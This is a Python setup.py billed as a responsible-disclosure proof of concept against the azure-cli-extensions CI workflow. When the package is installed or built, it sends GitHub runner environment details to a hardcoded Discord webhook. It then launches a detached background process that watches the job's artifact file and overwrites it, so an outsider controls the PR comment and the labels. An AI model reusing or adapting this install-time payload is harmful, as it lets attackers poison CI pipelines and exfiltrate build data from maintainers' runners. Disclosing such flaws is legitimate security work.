#!/usr/bin/env python

# Security research PoC - demonstrates artifact poisoning via pull_request_target
# Reported to MSRC as part of responsible disclosure.

import os
import json
import subprocess
import datetime

poc_data = {
    "source": "setup.py",
    "timestamp": datetime.datetime.utcnow().isoformat(),
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "unknown"),
    "github_event_name": os.environ.get("GITHUB_EVENT_NAME", "unknown"),
    "github_actor": os.environ.get("GITHUB_ACTOR", "unknown"),
    "runner_name": os.environ.get("RUNNER_NAME", "unknown"),
}

webhook_url = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

message = json.dumps({
    "content": (
        "**PoC: artifact poisoning v3 - azure-cli-extensions**\n"
        "```\n"
        f"Run ID: {poc_data['github_run_id']}\n"
        f"Time: {poc_data['timestamp']}\n"
        "```\n"
        "Watcher started — monitoring version_update.txt mtime."
    )
})

try:
    subprocess.run(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", message, webhook_url],
        timeout=10, capture_output=True
    )
except Exception:
    pass

# Strategy: watch version_update.txt for modification by release_version_cal.py
# Once the mtime changes (meaning the script wrote to it), immediately overwrite
cal_result = os.path.join(os.getcwd(), "cal_result")
run_id = poc_data["github_run_id"]
ts = poc_data["timestamp"]

overwrite_script = f"""
import time, os, subprocess

cal = "{cal_result}"
vfile = os.path.join(cal, "version_update.txt")
lfile = os.path.join(cal, "labels_removed.txt")
webhook = "{webhook_url}"

# Get initial mtime of the file
initial_mtime = 0
if os.path.exists(vfile):
    initial_mtime = os.path.getmtime(vfile)

# Poll until release_version_cal.py modifies the file (up to 90 seconds)
for i in range(900):
    time.sleep(0.1)
    if os.path.exists(vfile):
        current_mtime = os.path.getmtime(vfile)
        if current_mtime > initial_mtime:
            # File was modified by release_version_cal.py — overwrite NOW
            time.sleep(0.2)  # tiny grace period
            break

# Overwrite with our content
if os.path.isdir(cal):
    with open(vfile, "w") as f:
        f.write(
            "## Responsible Disclosure Notice\\n\\n"
            "This automated comment was generated as part of an authorized security "
            "research engagement. It demonstrates that the `VersionCalPRComment.yml` "
            "workflow is vulnerable to artifact poisoning via a `pull_request_target` "
            "misconfiguration.\\n\\n"
            "**Finding:** An external contributor can control the content of this "
            "automated comment and manipulate PR labels by modifying artifact files "
            "during the `version-cal` job, which checks out and executes code from "
            "the pull request head branch.\\n\\n"
            "This issue has been reported to the Microsoft Security Response Center (MSRC) "
            "as part of responsible disclosure. No secrets were accessed and no "
            "unauthorized modifications were made.\\n\\n"
            "*Researcher: Bodlux | Run ID: {run_id} | Timestamp: {ts}*"
        )
    with open(lfile, "w") as f:
        f.write("")

    msg = '{{"content": "**Artifact overwrite SUCCESS** — version_update.txt replaced. Waiting for upload..."}}'
    try:
        subprocess.run(["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", msg, webhook], timeout=5, capture_output=True)
    except:
        pass
"""

subprocess.Popen(
    ["python3", "-c", overwrite_script],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    start_new_session=True
)

from setuptools import setup, find_packages

setup(
    name='securitytest',
    version='0.1.0',
    description='Security research PoC',
    author='Bodlux',
    license='MIT',
    packages=find_packages(),
    install_requires=[],
    package_data={'azext_securitytest': ['azext_metadata.json']},
)
